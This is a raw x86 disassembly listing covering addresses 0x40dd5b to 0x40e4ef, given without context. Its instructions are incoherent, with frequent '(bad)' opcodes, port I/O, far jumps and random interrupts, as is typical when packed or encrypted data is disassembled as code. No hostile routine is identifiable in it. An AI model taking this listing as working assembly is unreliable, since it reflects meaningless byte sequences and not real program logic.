  40dd5b:	inc    ebx
  40dd5c:	inc    esp
  40dd5d:	cmp    bh,BYTE PTR [eax]
  40dd5f:	popa   
  40dd60:	lods   al,BYTE PTR ds:[esi]
  40dd61:	mov    ah,0xa9
  40dd63:	das    
  40dd64:	cmc    
  40dd65:	iret   
  40dd66:	lods   al,BYTE PTR ds:[esi]
  40dd67:	push   edi
  40dd68:	pop    ss
  40dd69:	fidiv  DWORD PTR [ebp-0x7d]
  40dd6c:	leave  
  40dd6d:	dec    edx
  40dd6e:	jns    0x40dd90
  40dd70:	xchg   esp,eax
  40dd71:	in     eax,dx
  40dd72:	jns    0x40dd3e
  40dd74:	pop    ss
  40dd75:	sbb    BYTE PTR [esi-0x79522146],dl
  40dd7b:	fcmovnb st,st(4)
  40dd7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7e:	iret   
  40dd7f:	sub    ah,BYTE PTR [edi-0x4a1f10cf]
  40dd85:	test   DWORD PTR [ecx*2+0x4c1d4f7],ebx
  40dd8c:	adc    edi,ecx
  40dd8e:	out    dx,al
  40dd8f:	push   ecx
  40dd90:	jb     0x40dd9f
  40dd92:	push   ds
  40dd93:	call   0xf019a901
  40dd98:	mov    WORD PTR [eax],ss
  40dd9a:	enter  0x782b,0x9e
  40dd9e:	push   es
  40dd9f:	in     al,0x8d
  40dda1:	sbb    BYTE PTR [eax],al
  40dda3:	inc    edi
  40dda4:	cmc    
  40dda5:	mov    edx,0x19139006
  40ddaa:	pop    ebp
  40ddab:	mov    ah,0x8d
  40ddad:	out    0x9d,al
  40ddaf:	and    eax,DWORD PTR [ebp+0x5b]
  40ddb2:	cmp    eax,0x506f66
  40ddb7:	push   cs
  40ddb8:	ins    DWORD PTR es:[edi],dx
  40ddb9:	je     0x40dd5d
  40ddbb:	aas    
  40ddbc:	icebp  
  40ddbd:	pushf  
  40ddbe:	fwait
  40ddbf:	loop   0x40dd6a
  40ddc1:	mov    al,ds:0xcb99059b
  40ddc6:	jecxz  0x40ddae
  40ddc8:	xchg   esi,eax
  40ddc9:	fisttp QWORD PTR es:[ebx+0x5e]
  40ddcd:	mov    edi,0x6d9f95c5
  40ddd2:	cmp    ecx,DWORD PTR [ecx+0x56]
  40ddd5:	xchg   DWORD PTR [esi],eax
  40ddd7:	iret   
  40ddd8:	bound  esi,QWORD PTR [esi-0x1aea510b]
  40ddde:	inc    ebx
  40dddf:	dec    ebp
  40dde0:	xchg   ecx,eax
  40dde1:	fwait
  40dde2:	lea    esp,[ebp+0xb]
  40dde5:	mov    ?,WORD PTR [esi-0x60c75edb]
  40ddeb:	push   ecx
  40ddec:	loopne 0x40dd75
  40ddee:	loope  0x40dd95
  40ddf0:	sub    ah,BYTE PTR [ecx+ebp*4-0x73093afb]
  40ddf7:	lods   eax,DWORD PTR ds:[esi]
  40ddf8:	xchg   ebx,eax
  40ddf9:	mov    BYTE PTR [esi+0x40],bh
  40ddfc:	ret    
  40ddfd:	adc    edi,ebx
  40ddff:	jae    0x40de09
  40de01:	jne    0x40dda9
  40de03:	test   BYTE PTR [edi+ebp*8+0x26],bh
  40de07:	jg     0x40de41
  40de09:	xchg   ebp,eax
  40de0a:	pop    edx
  40de0b:	pop    esi
  40de0c:	outs   dx,DWORD PTR ds:[esi]
  40de0d:	enter  0x170e,0xf5
  40de11:	repz xchg esp,eax
  40de13:	or     BYTE PTR [edx],dh
  40de15:	inc    edx
  40de16:	jl     0x40de1a
  40de18:	jle    0x40de4b
  40de1a:	rcl    DWORD PTR [eax],0x30
  40de1d:	imul   esp,DWORD PTR [edx+0x7721112e],0xfecdc11a
  40de27:	pop    edi
  40de28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de29:	std    
  40de2a:	(bad)  
  40de2b:	or     bh,dl
  40de2d:	mov    ecx,0x6a9d4d87
  40de32:	adc    DWORD PTR [ebx+ebp*1-0x6c],edi
  40de36:	sbb    esi,esp
  40de38:	repz (bad) [edi+0xc404a50]
  40de3f:	fs xchg ecx,eax
  40de41:	call   0x18cb:0x93ba139d
  40de48:	iret   
  40de49:	aaa    
  40de4a:	or     DWORD PTR [ecx-0x27],edx
  40de4d:	fwait
  40de4e:	fwait
  40de4f:	or     al,0x2b
  40de51:	test   BYTE PTR ss:[esp+eax*8],ah
  40de55:	stc    
  40de56:	popf   
  40de57:	test   al,0xea
  40de59:	sar    DWORD PTR [eax-0x51b7ef92],cl
  40de5f:	das    
  40de60:	fiadd  WORD PTR [edx+0x6f]
  40de63:	gs sbb eax,0x48a3631
  40de69:	popf   
  40de6a:	mov    dh,0xf3
  40de6c:	and    cl,0x4a
  40de6f:	mov    ah,0x79
  40de71:	cli    
  40de72:	xchg   edi,eax
  40de73:	or     eax,0x676f39c2
  40de78:	iret   
  40de79:	mov    ch,0x9e
  40de7b:	mov    ch,0x2d
  40de7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de7e:	sub    eax,0x7ba70a22
  40de83:	out    0x80,al
  40de85:	mov    dh,0x9d
  40de87:	ficomp WORD PTR [esi-0x4e82fdbb]
  40de8d:	cli    
  40de8e:	aas    
  40de8f:	ss stos DWORD PTR es:[edi],eax
  40de91:	cmp    al,0xe5
  40de93:	cmp    al,BYTE PTR [esi-0x536c6945]
  40de99:	pop    ebp
  40de9a:	xchg   edx,eax
  40de9b:	push   esp
  40de9c:	sbb    ebp,ecx
  40de9e:	imul   ebp,edx,0xffffffc7
  40dea1:	loop   0x40de64
  40dea3:	out    0x46,eax
  40dea5:	test   eax,0xf817981f
  40deaa:	fs xchg ebx,eax
  40deac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dead:	pop    ebx
  40deae:	xlat   BYTE PTR ds:[ebx]
  40deaf:	jo     0x40df0d
  40deb1:	les    esi,FWORD PTR [edi+0x196b5145]
  40deb7:	xchg   ecx,eax
  40deb8:	pop    edx
  40deb9:	jle    0x40de44
  40debb:	and    edi,DWORD PTR [eax+eax*8]
  40debe:	jbe    0x40de4c
  40dec0:	mov    WORD PTR [edi-0x45415ecb],cs
  40dec6:	mov    BYTE PTR [edi+0x5932f68e],dl
  40decc:	cwde   
  40decd:	idiv   BYTE PTR [ebx-0x1c]
  40ded0:	pop    es
  40ded1:	lods   al,BYTE PTR ds:[esi]
  40ded2:	aam    0x48
  40ded4:	scas   al,BYTE PTR es:[edi]
  40ded5:	shl    BYTE PTR [esi-0x2ba0cd3a],cl
  40dedb:	inc    edi
  40dedc:	mov    ecx,ebp
  40dede:	add    eax,0x16d60754
  40dee3:	sub    DWORD PTR [ecx],0xffffffe4
  40dee6:	add    ebx,esi
  40dee8:	or     al,0x3b
  40deea:	repz sahf 
  40deec:	ins    DWORD PTR es:[edi],dx
  40deed:	(bad)  
  40deee:	int    0xb6
  40def0:	pop    edx
  40def1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40def2:	adc    eax,DWORD PTR [eax+0x77]
  40def5:	mov    esi,0x541026c6
  40defa:	int    0x49
  40defc:	mov    dl,al
  40defe:	xchg   BYTE PTR [esi-0x554ccb2e],bl
  40df04:	outs   dx,BYTE PTR ds:[esi]
  40df05:	shr    BYTE PTR [ebx+0x22],1
  40df08:	dec    ecx
  40df09:	xchg   ebp,ecx
  40df0b:	aas    
  40df0c:	mov    eax,edx
  40df0e:	sub    BYTE PTR [esi],bl
  40df10:	xchg   esi,eax
  40df11:	cld    
  40df12:	jp     0x40df25
  40df14:	popa   
  40df15:	jns    0x40df67
  40df17:	and    cl,BYTE PTR ds:0xa3f380fc
  40df1d:	pop    esp
  40df1e:	stc    
  40df1f:	lock mov ch,0x7d
  40df22:	scas   eax,DWORD PTR es:[edi]
  40df23:	lds    eax,FWORD PTR [esi+ecx*2+0x7917e81f]
  40df2a:	dec    esp
  40df2b:	jnp    0x40dee9
  40df2d:	sbb    BYTE PTR [edx-0x1169cce5],0x4c
  40df34:	xor    ah,BYTE PTR ds:0xd9fde10c
  40df3a:	int3   
  40df3b:	gs je  0x40defb
  40df3e:	sub    bh,BYTE PTR [ebx+0x55]
  40df41:	jmp    0x8a477c65
  40df46:	cmp    ch,BYTE PTR [eax+0x69]
  40df49:	lods   al,BYTE PTR ds:[esi]
  40df4a:	jbe    0x40df74
  40df4c:	and    al,0x95
  40df4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df4f:	dec    edi
  40df50:	sub    BYTE PTR ds:0xb1901e55,dl
  40df56:	aaa    
  40df57:	mov    esp,0x2bbe759c
  40df5c:	int3   
  40df5d:	lds    ebp,FWORD PTR [edx+0x7c7d228b]
  40df63:	xor    dh,BYTE PTR [edi]
  40df65:	fimul  WORD PTR [esi]
  40df67:	xor    al,0x3d
  40df69:	push   es
  40df6a:	loope  0x40df86
  40df6c:	jb     0x40def5
  40df6e:	sbb    edx,esp
  40df70:	scas   al,BYTE PTR es:[edi]
  40df71:	xor    ebp,ebp
  40df73:	int3   
  40df74:	sahf   
  40df75:	fsubr  QWORD PTR [edx+0x64f35592]
  40df7b:	clc    
  40df7c:	test   DWORD PTR [esi-0x78],ebp
  40df7f:	fisub  WORD PTR [edx+0x6b]
  40df82:	fidivr WORD PTR [edi]
  40df84:	adc    al,0x8d
  40df86:	inc    esi
  40df87:	or     cl,BYTE PTR [ebp+0x79c63737]
  40df8d:	inc    edx
  40df8e:	sbb    bh,BYTE PTR [ebx+0x71]
  40df91:	jg     0x40df96
  40df93:	call   DWORD PTR [edi+0x201c32a5]
  40df99:	(bad)  
  40df9b:	(bad)  
  40df9c:	(bad)  
  40df9d:	mov    ds:0xef1201a2,eax
  40dfa2:	in     al,0x1f
  40dfa4:	sub    cl,BYTE PTR [ebx-0x2bf402e5]
  40dfaa:	mov    WORD PTR [edx+0x52d8ad25],fs
  40dfb0:	stos   DWORD PTR es:[edi],eax
  40dfb1:	mov    esi,0xdd941652
  40dfb6:	mov    bh,0x5f
  40dfb8:	stc    
  40dfb9:	(bad)  
  40dfba:	in     eax,dx
  40dfbb:	mov    edi,0x483d2e39
  40dfc0:	(bad)
  40dfc3:	ss mov eax,ds:0xee2a2599
  40dfca:	repnz ins BYTE PTR es:[edi],dx
  40dfcc:	adc    al,0xfe
  40dfce:	xchg   ebx,eax
  40dfcf:	sbb    BYTE PTR ds:0xc421df3f,ah
  40dfd5:	xor    al,0x5a
  40dfd7:	jo     0x40df5b
  40dfd9:	push   esp
  40dfda:	arpl   WORD PTR [esi+0x5b],bx
  40dfdd:	mov    edi,eax
  40dfdf:	iret   
  40dfe0:	out    dx,eax
  40dfe1:	push   0x9bb3b9e9
  40dfe6:	push   edi
  40dfe7:	not    BYTE PTR [edi]
  40dfe9:	push   ss
  40dfea:	mov    ebx,0xc2d57765
  40dfef:	shl    BYTE PTR [edi+0x2369b8f],0xf3
  40dff6:	mov    esi,0x97b18cda
  40dffb:	call   0x72d8:0xa9017d91
  40e002:	in     eax,dx
  40e003:	test   BYTE PTR [ecx],ah
  40e005:	sbb    al,0xbf
  40e007:	je     0x40e07a
  40e009:	xor    DWORD PTR [ecx+0x68],ecx
  40e00c:	rol    BYTE PTR [eax],1
  40e00e:	dec    eax
  40e00f:	cwde   
  40e010:	addr16 popf 
  40e012:	shl    DWORD PTR [esi-0x44],1
  40e015:	lds    ebx,FWORD PTR [edi+0x7cd19585]
  40e01b:	add    al,0xd
  40e01d:	dec    ebp
  40e01e:	(bad)  
  40e01f:	je     0x40dfe7
  40e021:	jnp    0x40dfcb
  40e023:	or     bh,dh
  40e025:	iret   
  40e026:	and    edx,0xffffff92
  40e029:	int    0xa5
  40e02b:	leave  
  40e02c:	push   es
  40e02d:	pusha  
  40e02e:	sbb    esi,DWORD PTR [ecx]
  40e030:	inc    ebx
  40e031:	mov    ?,WORD PTR [ebx]
  40e033:	(bad)  
  40e034:	in     eax,dx
  40e035:	push   ebx
  40e036:	loopne 0x40e041
  40e038:	in     al,0xff
  40e03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e03b:	adc    ebx,DWORD PTR [edx]
  40e03d:	mul    BYTE PTR [edx+0x4bab9865]
  40e043:	test   al,0xad
  40e045:	xchg   edi,eax
  40e046:	ja     0x40e069
  40e048:	add    eax,0x7fbabcca
  40e04d:	ds (bad) 
  40e050:	push   es
  40e051:	or     BYTE PTR [edx-0x21ce6085],dl
  40e057:	ror    eax,cl
  40e059:	xchg   edx,eax
  40e05a:	mov    ebp,0xab272bb2
  40e05f:	mov    dh,0x8c
  40e061:	fwait
  40e062:	dec    edx
  40e063:	in     al,0x2b
  40e065:	out    0xf9,eax
  40e067:	fbld   TBYTE PTR [ecx]
  40e069:	add    ebp,DWORD PTR [eax]
  40e06b:	fist   WORD PTR [edi]
  40e06d:	(bad)  
  40e06e:	and    BYTE PTR ss:[esi+0x7ef4ecf2],bh
  40e075:	imul   esp,DWORD PTR [ebx-0x58],0x6896bf0c
  40e07c:	les    esi,FWORD PTR [esi+edx*2]
  40e07f:	(bad)  
  40e080:	mov    ecx,0x34e2ecc0
  40e085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e086:	inc    edx
  40e087:	mov    BYTE PTR [edx-0x19],cl
  40e08a:	or     al,BYTE PTR [edx]
  40e08c:	mov    bh,0x7d
  40e08e:	adc    ebp,DWORD PTR [eax+edi*1+0x2ce0c962]
  40e095:	(bad)  
  40e096:	aam    0x81
  40e098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e099:	and    al,0x3f
  40e09b:	push   ds
  40e09c:	pop    esp
  40e09d:	jne    0x40e063
  40e09f:	fwait
  40e0a0:	push   ebp
  40e0a1:	xchg   esi,eax
  40e0a2:	dec    ebp
  40e0a3:	jmp    0x40e09a
  40e0a5:	or     edi,DWORD PTR ds:0x1aea012f
  40e0ab:	sub    eax,DWORD PTR [ecx-0x469091e2]
  40e0b1:	in     eax,dx
  40e0b2:	push   eax
  40e0b3:	xor    dl,BYTE PTR [ecx]
  40e0b5:	cli    
  40e0b6:	push   esi
  40e0b7:	clc    
  40e0b8:	sbb    BYTE PTR [ebx-0x33e2f54],bh
  40e0be:	arpl   WORD PTR [ebx+0x4efaf091],bp
  40e0c4:	int    0x12
  40e0c6:	stc    
  40e0c7:	or     DWORD PTR [edx+0x44],eax
  40e0ca:	cmp    edx,DWORD PTR [esi+eiz*4-0x3a15d31d]
  40e0d1:	adc    ebx,ebp
  40e0d3:	push   edi
  40e0d4:	sti    
  40e0d5:	jmp    0x7110:0xb705106c
  40e0dc:	out    0x6b,al
  40e0de:	or     ebp,DWORD PTR [edi]
  40e0e0:	aam    0x97
  40e0e2:	mov    edx,0xa2f79916
  40e0e7:	cmc    
  40e0e8:	sbb    DWORD PTR [ecx+0x2424557a],esp
  40e0ee:	and    BYTE PTR [edx-0x7e757055],ch
  40e0f4:	inc    edi
  40e0f5:	pop    ss
  40e0f6:	into   
  40e0f7:	sub    ecx,DWORD PTR [esi-0x45871abc]
  40e0fd:	or     al,0x1e
  40e0ff:	xchg   ebp,esp
  40e101:	adc    bh,BYTE PTR [esi]
  40e103:	xchg   ecx,eax
  40e104:	jno    0x40e166
  40e106:	xchg   esi,eax
  40e107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e108:	pop    ebx
  40e109:	lock mov al,0xd4
  40e10c:	loopne 0x40e0a8
  40e10e:	dec    eax
  40e10f:	add    dh,BYTE PTR [eax-0x1812ee6e]
  40e115:	sti    
  40e116:	ret    
  40e117:	dec    edi
  40e118:	and    BYTE PTR [eax+eiz*1+0x6d006baa],dl
  40e11f:	imul   edx,DWORD PTR [ecx+0x5c],0x12753627
  40e126:	cmp    eax,0x17c24a11
  40e12b:	lods   al,BYTE PTR ds:[esi]
  40e12c:	dec    ecx
  40e12d:	repz imul ecx,DWORD PTR [edx+0x60343aea],0xffffffaa
  40e135:	bound  esp,QWORD PTR [ebp-0x80]
  40e138:	(bad)  
  40e139:	sub    eax,0x6e79003b
  40e13e:	pusha  
  40e13f:	xchg   ecx,eax
  40e140:	and    ch,BYTE PTR [ecx+0x4f]
  40e143:	mov    ebp,0x2a91b1e1
  40e148:	push   es
  40e149:	mov    dh,0xc5
  40e14b:	jo     0x40e0d4
  40e14d:	sub    ch,BYTE PTR [esi-0x569f2023]
  40e153:	mov    DWORD PTR [ebp-0x56cddfb],edx
  40e159:	add    bl,al
  40e15b:	das    
  40e15c:	imul   edx,DWORD PTR [edx-0x77c75510],0x877b0dd4
  40e166:	pinsrw mm3,edx,0x82
  40e16a:	jne    0x40e0f6
  40e16c:	shl    BYTE PTR [edx+esi*8+0x50],1
  40e170:	adc    DWORD PTR [edi+0x56f19b31],0xa8a7d7a5
  40e17a:	push   esp
  40e17b:	sbb    eax,0xec6427cb
  40e180:	mov    cl,cl
  40e182:	add    dl,BYTE PTR [esi+0x290ee9e7]
  40e188:	imul   esp,DWORD PTR [edx-0x5645289b],0xebe2162c
  40e192:	inc    edx
  40e193:	mov    edi,0x6a9ef23b
  40e198:	cmp    eax,0x8afdfb63
  40e19d:	sbb    BYTE PTR [eax+ebp*1-0x1f2fc2e5],bh
  40e1a4:	mov    dl,0xe7
  40e1a6:	in     eax,0xe7
  40e1a8:	or     al,0x8e
  40e1aa:	cli    
  40e1ab:	adc    eax,0x33218e3f
  40e1b0:	(bad)  
  40e1b1:	ins    DWORD PTR es:[edi],dx
  40e1b2:	fiadd  DWORD PTR [edi-0x46]
  40e1b5:	sbb    eax,0x9797201
  40e1ba:	fimul  WORD PTR ss:[ecx+0xe]
  40e1be:	retf   
  40e1bf:	(bad)  
  40e1c0:	retfw  
  40e1c2:	(bad)  
  40e1c3:	data16 jno 0x40e1a0
  40e1c6:	xchg   edi,ebp
  40e1c8:	stos   BYTE PTR es:[edi],al
  40e1c9:	mov    WORD PTR [edi-0x7601a3c8],cs
  40e1cf:	imul   esi,DWORD PTR [edx+ecx*4+0x70],0x49
  40e1d4:	mov    fs,WORD PTR [ebp+0x33]
  40e1d7:	in     eax,dx
  40e1d8:	dec    ecx
  40e1d9:	dec    esp
  40e1da:	mov    fs,WORD PTR ds:0xf7d408c0
  40e1e0:	dec    esi
  40e1e1:	adc    al,0xea
  40e1e3:	out    0x3f,eax
  40e1e5:	fs dec ebx
  40e1e7:	cs xchg esi,eax
  40e1e9:	sti    
  40e1ea:	scas   eax,DWORD PTR es:[edi]
  40e1eb:	ror    DWORD PTR [esi-0x67],0x39
  40e1ef:	inc    eax
  40e1f0:	(bad)  
  40e1f1:	xor    al,0xc
  40e1f3:	add    ecx,esp
  40e1f5:	sbb    DWORD PTR [esi-0x6e3fe5ed],esp
  40e1fb:	sar    DWORD PTR [ecx],cl
  40e1fd:	and    DWORD PTR ds:0x55c94f82,0x48e8b1e7
  40e207:	sahf   
  40e208:	xchg   esi,eax
  40e209:	cmp    ecx,DWORD PTR cs:[ebx+0x66cd65]
  40e210:	clc    
  40e211:	stos   BYTE PTR es:[edi],al
  40e212:	lahf   
  40e213:	shr    DWORD PTR [edx],cl
  40e215:	adc    DWORD PTR [ebp-0x68],0x3e
  40e219:	icebp  
  40e21a:	push   edx
  40e21b:	mov    ebp,0x7d9b09d9
  40e220:	popf   
  40e221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e222:	rcl    BYTE PTR [edx+0x2f],1
  40e225:	push   0x721dbcf8
  40e22a:	pop    ss
  40e22b:	xor    bl,0x81
  40e22e:	call   0x33da:0x73be1fd4
  40e235:	jae    0x40e26d
  40e237:	(bad)  
  40e238:	(bad)
  40e23c:	push   esp
  40e23d:	and    BYTE PTR [esi+0x666321b7],dh
  40e243:	mov    al,ds:0x7c25f8c5
  40e248:	repnz ins BYTE PTR es:[edi],dx
  40e24a:	sbb    DWORD PTR [ecx+ecx*8+0x1bcf6629],esp
  40e251:	pop    es
  40e252:	xor    BYTE PTR [eax+0x63635e3a],ch
  40e258:	mov    ch,0x2a
  40e25a:	mov    esp,0x22d18f53
  40e25f:	jl     0x40e275
  40e261:	std    
  40e262:	sahf   
  40e263:	pop    ss
  40e264:	sub    BYTE PTR [esi-0x1752009b],ah
  40e26a:	je     0x40e22e
  40e26c:	push   cs
  40e26d:	push   0xffffffc3
  40e26f:	idiv   BYTE PTR [eax+esi*2+0x3d585380]
  40e276:	loope  0x40e2e7
  40e278:	xchg   edi,eax
  40e279:	cld    
  40e27a:	pushf  
  40e27b:	retf   
  40e27c:	scas   eax,DWORD PTR es:[edi]
  40e27d:	or     eax,0x1b29c619
  40e282:	add    cl,BYTE PTR [edx]
  40e284:	adc    DWORD PTR [edi-0x80],edx
  40e287:	xor    esp,ebx
  40e289:	mov    al,0xa0
  40e28b:	sub    ebx,esi
  40e28d:	mov    DWORD PTR [esi-0x4fbc0f45],edx
  40e293:	mov    eax,ds:0x1d9cd
  40e298:	mov    ds:0xdc5dc98b,al
  40e29d:	int    0x57
  40e29f:	cli    
  40e2a0:	xor    eax,0xa06e30eb
  40e2a5:	xor    eax,0x58460c80
  40e2aa:	sub    ebp,DWORD PTR [ebp-0x390412e6]
  40e2b0:	sub    dl,ch
  40e2b2:	add    DWORD PTR [edi+0x3a],eax
  40e2b5:	jmp    0x40e30c
  40e2b7:	xchg   esi,eax
  40e2b8:	and    cl,BYTE PTR [edi]
  40e2ba:	push   eax
  40e2bb:	pop    fs
  40e2bd:	loopne 0x40e304
  40e2bf:	mov    ah,0x9
  40e2c1:	mov    eax,ds:0x3b21af10
  40e2c6:	jno    0x40e2e3
  40e2c8:	push   ds
  40e2c9:	(bad)  
  40e2ca:	jbe    0x40e2bb
  40e2cc:	out    0xc3,eax
  40e2ce:	les    ebp,FWORD PTR [edx-0x4a]
  40e2d1:	aaa    
  40e2d2:	mov    esp,ss
  40e2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d5:	fimul  DWORD PTR [ebp-0x967534]
  40e2db:	xor    al,0x4f
  40e2dd:	ins    DWORD PTR es:[edi],dx
  40e2de:	inc    edx
  40e2df:	sbb    BYTE PTR [eax+0x6dabdfa3],bh
  40e2e5:	adc    edi,0x7b
  40e2e8:	in     al,0x13
  40e2ea:	(bad)  
  40e2eb:	dec    edi
  40e2ec:	jecxz  0x40e305
  40e2ee:	mov    ds:0x5f323f7b,eax
  40e2f3:	loop   0x40e347
  40e2f5:	and    BYTE PTR [esi],0x93
  40e2f8:	push   ebx
  40e2f9:	dec    eax
  40e2fa:	loop   0x40e2c5
  40e2fc:	cmp    eax,0xa21bd02a
  40e301:	popf   
  40e302:	and    edx,DWORD PTR [ebx+0x60c20235]
  40e308:	and    eax,0x1c03dd3c
  40e30d:	(bad)  [eax]
  40e30f:	ret    0x99a3
  40e312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e313:	out    0xb3,al
  40e315:	mov    edx,gs
  40e317:	retf   
  40e318:	and    DWORD PTR [ebp-0x11],0x99512f6b
  40e31f:	mov    edx,0xf4fc304a
  40e324:	lock cdq 
  40e326:	stos   BYTE PTR es:[edi],al
  40e327:	sub    ecx,ecx
  40e329:	enter  0xe748,0xb1
  40e32d:	(bad)  
  40e32e:	mov    bl,0xaa
  40e330:	scas   al,BYTE PTR es:[edi]
  40e331:	mov    ds:0xfb382b33,al
  40e336:	jae    0x40e2e5
  40e338:	std    
  40e339:	and    DWORD PTR [edx+0x27b4f8b4],ecx
  40e33f:	lods   al,BYTE PTR ds:[esi]
  40e340:	test   al,0x2
  40e342:	mov    ecx,0xd42e34e1
  40e347:	(bad)  
  40e348:	lods   eax,DWORD PTR ds:[esi]
  40e349:	ja     0x40e2eb
  40e34b:	fist   WORD PTR fs:[edx-0x1dc08fa7]
  40e352:	mov    edx,0xa1462f5f
  40e357:	sub    BYTE PTR [ebp+0xdf78fb],cl
  40e35d:	or     dl,ah
  40e35f:	sbb    edx,ebp
  40e361:	je     0x40e3d3
  40e363:	pop    eax
  40e364:	adc    dl,BYTE PTR [ebp-0x3eea59c6]
  40e36a:	sbb    al,0x87
  40e36c:	call   0x363a:0xb4ab2979
  40e373:	adc    BYTE PTR [ebp+0x19],0x96
  40e377:	xor    al,0xcf
  40e379:	aaa    
  40e37a:	push   edi
  40e37b:	ret    
  40e37c:	jns    0x40e3b8
  40e37e:	int3   
  40e37f:	push   ds
  40e380:	jne    0x40e344
  40e382:	cmc    
  40e383:	ins    BYTE PTR es:[edi],dx
  40e384:	xchg   edi,eax
  40e385:	or     bh,BYTE PTR [ecx+0xf5dc884]
  40e38b:	mov    dh,0xc6
  40e38d:	or     ebp,DWORD PTR [edi-0x75]
  40e390:	cs popa 
  40e392:	dec    eax
  40e393:	cmp    DWORD PTR [ebx+0x2cba794e],esp
  40e399:	test   DWORD PTR [esi+0x44],ebx
  40e39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e39d:	ret    
  40e39e:	(bad)  
  40e39f:	adc    al,0xcf
  40e3a1:	rol    BYTE PTR [edi*1-0x294d0fe6],cl
  40e3a8:	push   0x54
  40e3aa:	ss cmp al,ah
  40e3ad:	xor    al,0x9
  40e3af:	sub    bl,al
  40e3b1:	push   edi
  40e3b2:	push   ss
  40e3b3:	pushf  
  40e3b4:	cdq    
  40e3b5:	enter  0x56b2,0x33
  40e3b9:	or     eax,DWORD PTR [edx-0x23]
  40e3bc:	inc    eax
  40e3bd:	jp     0x40e42e
  40e3bf:	mov    al,0xa4
  40e3c1:	sub    al,BYTE PTR [edi-0x3215fa0]
  40e3c7:	and    bl,BYTE PTR [eax-0x1c]
  40e3ca:	and    BYTE PTR [ebp-0x4e],ah
  40e3cd:	fcom   st(3)
  40e3cf:	fdivr  st(7),st
  40e3d1:	ficomp WORD PTR [eax]
  40e3d3:	lock imul DWORD PTR [ebx-0x31ce3dcb]
  40e3da:	sub    ecx,DWORD PTR [ecx]
  40e3dc:	imul   ecx,DWORD PTR [esi+0x70e1fe28],0xffffff81
  40e3e3:	fs icebp 
  40e3e5:	adc    dh,BYTE PTR ds:0x1738ad59
  40e3eb:	ffreep st(7)
  40e3ed:	retf   0xaa99
  40e3f0:	stos   BYTE PTR es:[edi],al
  40e3f1:	lods   eax,DWORD PTR ds:[esi]
  40e3f2:	xor    al,bh
  40e3f4:	and    eax,0x421a56cd
  40e3f9:	test   al,0x16
  40e3fb:	retf   0x6858
  40e3fe:	loope  0x40e47d
  40e400:	xor    eax,0x80692d85
  40e405:	fimul  DWORD PTR [edi+0x44]
  40e408:	out    0xc6,eax
  40e40a:	lea    ebp,[eax]
  40e40c:	add    dl,BYTE PTR [edx+ecx*1+0x345807d0]
  40e413:	lds    edi,FWORD PTR [edi]
  40e415:	pop    es
  40e416:	loop   0x40e45e
  40e418:	cli    
  40e419:	popf   
  40e41a:	loope  0x40e40e
  40e41c:	ss pop ebx
  40e41e:	jmp    0x682a:0x8d69ba0
  40e425:	cmp    BYTE PTR [esi],0xe5
  40e428:	lahf   
  40e429:	jb     0x40e40a
  40e42b:	push   edi
  40e42c:	imul   ebx,DWORD PTR es:[edi-0x43400d70],0xd35eacb6
  40e437:	data16 jl 0x40e3ef
  40e43a:	mov    ds:0x55d1857c,al
  40e43f:	pop    es
  40e440:	aam    0x9b
  40e442:	das    
  40e443:	ret    0x6bc4
  40e446:	jno    0x40e469
  40e448:	pop    ebp
  40e449:	out    dx,al
  40e44a:	jnp    0x40e44b
  40e44c:	cmc    
  40e44d:	sub    eax,0xd97f240
  40e452:	and    edx,ebp
  40e454:	outs   dx,DWORD PTR ds:[esi]
  40e455:	jmp    0x40e4be
  40e457:	mov    dh,BYTE PTR [ecx+edi*2]
  40e45a:	ja     0x40e3ea
  40e45c:	pop    esi
  40e45d:	sahf   
  40e45e:	es out dx,eax
  40e460:	sub    ebx,DWORD PTR [esi-0x9]
  40e463:	gs inc edi
  40e465:	(bad)  
  40e466:	shr    BYTE PTR [ecx+0x189d6d1c],1
  40e46c:	add    al,0x17
  40e46e:	bound  edx,QWORD PTR ds:0xe7219aa3
  40e474:	aam    0xaf
  40e476:	das    
  40e477:	std    
  40e478:	jne    0x40e4ca
  40e47a:	xchg   BYTE PTR [esp+edx*4+0x7b],bh
  40e47e:	ret    0xc457
  40e481:	(bad)  
  40e482:	pop    esp
  40e483:	ror    BYTE PTR [edx-0x7ff44990],1
  40e489:	mov    al,ds:0x6d8b66fd
  40e48e:	pop    ebx
  40e48f:	std    
  40e490:	(bad)  
  40e491:	cmp    edx,ebx
  40e493:	fcomp  DWORD PTR [esi-0x7c]
  40e496:	sub    BYTE PTR [ebx],bl
  40e498:	mov    edi,0x20295735
  40e49d:	add    BYTE PTR [edx+0x1898caf4],dh
  40e4a3:	pop    ds
  40e4a4:	jmp    0x26f8c0bc
  40e4a9:	shr    BYTE PTR [edx],1
  40e4ab:	int    0x4c
  40e4ad:	jl     0x40e435
  40e4af:	sahf   
  40e4b0:	repnz mov esi,0xe5e17c51
  40e4b6:	imul   edx,DWORD PTR [ebp-0x64b97812],0x854ba535
  40e4c0:	mov    eax,ds:0x344956aa
  40e4c5:	loopne 0x40e4af
  40e4c7:	dec    ebx
  40e4c8:	cli    
  40e4c9:	jecxz  0x40e4d6
  40e4cb:	into   
  40e4cc:	mov    ds:0xb1f494ee,eax
  40e4d2:	arpl   WORD PTR [edx+0x7afdf5d9],sp
  40e4d8:	int3   
  40e4d9:	xor    edx,DWORD PTR [esi+0x1a]
  40e4dc:	xchg   BYTE PTR [ebx-0x66],ch
  40e4df:	fisub  WORD PTR [edi]
  40e4e1:	jo     0x40e510
  40e4e3:	dec    esp
  40e4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e5:	add    eax,0x76b0bfd8
  40e4ea:	mov    ecx,0x2a9c8c67
  40e4ef:	pop    esi
